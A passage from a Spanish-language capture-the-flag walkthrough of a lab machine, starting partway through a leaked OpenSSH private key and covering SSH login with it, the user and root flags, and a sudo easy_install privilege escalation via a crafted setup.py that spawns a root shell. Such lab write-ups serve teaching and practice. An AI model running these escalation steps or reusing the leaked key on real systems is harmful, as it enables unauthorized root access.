wCb5o0xFjJbF8PuSasQO7FSW+TIjKH9EV/5Uy7BRCpUngxw30L7altfJ6nLGb2a3ZIi66p
0QY/HBIGREw74gfivt4g+lpPjD23TTMwYuVkr56aoxUIGIX84d/HuDTZL9at5gxCvB3oz5
VkKpZSWCnbuUVqnSFpHytRgjCx5f+inb++AzR4l2/ktrVl6fyiNAAiDs0aurHynsMNUjvO
N8WLHlBgS6IDcmEqhgXXbEmUTY53WdDhSbHZJo0PF2GRCnNQAAAMEAyuRjcawrbEZgEUXW
z3vcoZFjdpU0j9NSGaOyhxMEiFNwmf9xZ96+7xOlcVYoDxelx49LbYDcUq6g2O324qAmRR
RtUPADO3MPlUfI0g8qxqWn1VSiQBlUFpw54GIcuSoD0BronWdjicUP0fzVecjkEQ0hp7gu
gNyFi4s68suDESmL5FCOWUuklrpkNENk7jzjhlzs3gdfU0IRCVpfmiT7LDGwX9YLfsVXtJ
mtpd5SG55TJuGJqXCyeM+U0DBdxsT5AAAAwQDDfs/CULeQUO+2Ij9rWAlKaTEKLkmZjSqB
2d9yJVHHzGPe1DZfRu0nYYonz5bfqoAh2GnYwvIp0h3nzzQo2Svv3/ugRCQwGoFP1zs1aa
ZSESqGN9EfOnUqvQa317rHnO3moDWTnYDbynVJuiQHlDaSCyf+uaZoCMINSG5IOC/4Sj0v
3zga8EzubgwnpU7r9hN2jWboCCIOeDtvXFv08KT8pFDCCA+sMa5uoWQlBqmsOWCLvtaOWe
N4jA+ppn1+3e0AAAASZGV2ZWxvcGVyQHNpdGVpc3VwAQ==
-----END OPENSSH PRIVATE KEY-----
[...]
developer@updown:~$ 
```

Finalmente, guardamos la clave privada en un fichero, le damos **permisos 600** y accedemos por ***SSH***:

```bash
chmod 600 id_rsa
ssh developer@10.10.11.177 -i id_rsa

[...]
Last login: Tue Jan 17 13:05:32 2023 from 10.10.14.127
developer@updown:~$ 
```

### user.txt

Podemos encontrar la primera *flag* en el *homedir* de *developer*:

```bash
developer@updown:~$ cat user.txt 
1eefaf3e3a6a648a24ca30cabe550728
```

## Consiguiendo shell como root

### Reconocimiento del sistema

#### sudoers

Para listar los privilegios de **_sudo_** asignados al usuario *developer* utilizaremos el comando `sudo -l`:

```bash
developer@updown:~$ sudo -l
Matching Defaults entries for developer on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User developer may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/local/bin/easy_install
```

Podemos ejecutar como ***root*** el binario */usr/local/bin/easy_install*.

*easy_install* es una herramienta para instalar paquetes de *Python* en sistemas *Linux*.

#### Explotación del binario easy_install

Al tratarse de un binario conocido, podemos buscar en [GTFObins](https://gtfobins.github.io/gtfobins/easy_install/) si presenta alguna vulnerabilidad que nos permita escalar privilegios. Teniendo permisos de *sudo*, los pasos a seguir son los siguientes:

```bash
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo easy_install $TF
```

```bash
developer@updown:~$ TF=$(mktemp -d)
developer@updown:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
developer@updown:~$ sudo /usr/local/bin/easy_install $TF
WARNING: The easy_install command is deprecated and will be removed in a future version.
Processing tmp.MsysFeFmHD
Writing /tmp/tmp.MsysFeFmHD/setup.cfg
Running setup.py -q bdist_egg --dist-dir /tmp/tmp.MsysFeFmHD/egg-dist-tmp-5Im0md
## whoami
root
```

### root.txt

Encontraremos la segunda *flag* en el *homedir* de *root*:

```bash
## cat root.txt
4d58348454902d55b092802f34d2fd15
```





